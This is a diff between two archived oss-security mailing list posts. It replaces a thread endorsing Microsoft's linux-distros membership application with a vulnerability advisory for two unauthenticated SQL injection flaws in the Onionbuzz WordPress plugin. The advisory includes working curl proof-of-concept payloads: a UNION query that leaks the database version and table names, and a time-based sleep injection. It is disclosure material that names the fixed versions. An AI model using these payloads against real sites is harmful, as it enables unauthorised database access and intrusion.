@@ -1,52 +1,68 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/06/27/9
-Message-Id: <CE800BE0-7398-4ABA-9980-ABC97A6EB67D@oracle.com>
-Date: Thu, 27 Jun 2019 19:56:45 +0100
-From: John Haxby <john.haxby@...cle.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/07/21/1
+Message-ID: <CAN1YN0tHY1PbJ=WeUDs=ToCZ-_JetOhAnJwou3PCdcfsoFy9Cg@mail.gmail.com>
+Date: Sat, 20 Jul 2019 18:35:49 -0400
+From: Eugene Kolo <eugene@...enekolo.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: linux-distros membership application - Microsoft
+Subject: Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin
 Content-Type: text/plain; charset=utf-8
 
+Two unauthenticated/unprivileged SQL injection vulnerabilities in the Viral
+Quiz Maker - Onionbuzz WordPress plugin.
+
+Information
+===========
+Affected Product: Viral Quiz Maker - OnionBuzz WordPress plugin
+Vendor Homepage: Onionbuzz.com
+Vulnerability Type: SQL Injection
+Discoverer: Eugene Kolodenker
+Date: July-20-2019
+
+1)
+
+Description
+===========
+Prior to v1.2.2, you could exploit the `points` parameter in the
+`ob_get_results` ajax nopriv handler due to there being no sanitization on
+the points argument. The points parameter is not sanitized prior to be used
+in a SQL query in getResultByPointsTrivia. This allows an
+unauthenticated/unprivileged user to perform a SQL injection attack capable
+of remote code execution and information disclosure.
+
+Proof of Concept (POC)
+======================
+```
+curl http://site/wp-admin/admin-ajax.php?action=ob_get_results --data
+"type=get_result&id=1&quiz_type=5&points=1 or 1=0 union all select
+1,1,version(),table_name,1,1,1,1,1 from information_schema.tables;#"
+```
+
+And get back:
+```
+{"quiz_id":1,"points":"1 or 1=0 union all select
+1,1,version(),table_name,1,1,1,1,1 from
+information_schema.tables;#","title":<DBVERSION>","description":"CHARACTER_SETS","featured_image":"<img
+src=\"1\">","image_caption":"1","is_image":1,"success":1}
+```
 
 
-> On 27 Jun 2019, at 18:48, Tyler Hicks <tyhicks@...onical.com> wrote:
-> 
-> On 2019-06-27 09:57:38, Anthony Liguori wrote:
->> On Thu, Jun 27, 2019 at 7:05 AM Solar Designer <solar@...nwall.com> wrote:
->>>>> 3. Have a publicly verifiable track record, dating back at least 1
->>>>> year and continuing to present day, of fixing security issues
->>>>> (including some that had been handled on (linux-)distros, meaning that
->>>>> membership would have been relevant to you) and releasing the fixes
->>>>> within 10 days (and preferably much less than that) of the issues
->>>>> being made public (if it takes you ages to fix an issue, your users
->>>>> wouldn't substantially benefit from the additional time, often around
->>>>> 7 days and sometimes up to 14 days, that list membership could give
->>>>> you).
->>>> 
->>>> Microsoft has decades long history of addressing security issues via
->>>> MSRC (https://www.microsoft.com/en-us/msrc). While we are able to
->>>> quickly (<1-2 hours) create a build to address disclosed security
->>>> issues, we require extensive testing and validation before we make these
->>>> builds public. Being members of this mailing list would provide us the
->>>> additional time we need for extensive testing.
->>> 
->>> It'd be helpful if you could directly address this part: "including some
->>> that had been handled on (linux-)distros, meaning that membership would
->>> have been relevant to you".  Without such examples yet, we'd have to be
->>> guessing whether the membership would have been relevant to you or not.
->> 
->> I'm not aware of issues on the distros list, but Microsoft has been
->> very active in working with the broader community on Spectre/Meltdown
->> style mitigations.  I think the community would benefit overall from
->> their participation on distros.
-> 
-> I agree with Anthony on this point. They've been beneficial to the
-> greater Linux community and I feel like their direct involvement on
-> linux-distros would benefit other members.
-> 
-> Tyler
+2)
+
+Description
+===========
+Prior to v1.2.7, you could exploit the `id` parameter in the `set_count`
+ajax nopriv handler due to there being no sanitization on the id argument.
+The id parameter is not sanitized prior to be used in a SQL query in
+saveQuestionVote. This allows an unauthenticated/unprivileged user to
+perform a SQL injection attack capable of remote code execution and
+information disclosure.
 
 
-I know this is "me too" but I agree with both Anthony and Tyler.  I'd also endorse Sasha personally from my association with him in the past.
+Proof of Concept (POC)
+======================
 
-jch
+```
+curl http://site/wp-admin/admin-ajax.php?type=set_count --data
+"action=ob_question_votes&id=1 or sleep(10);#"
+```
+
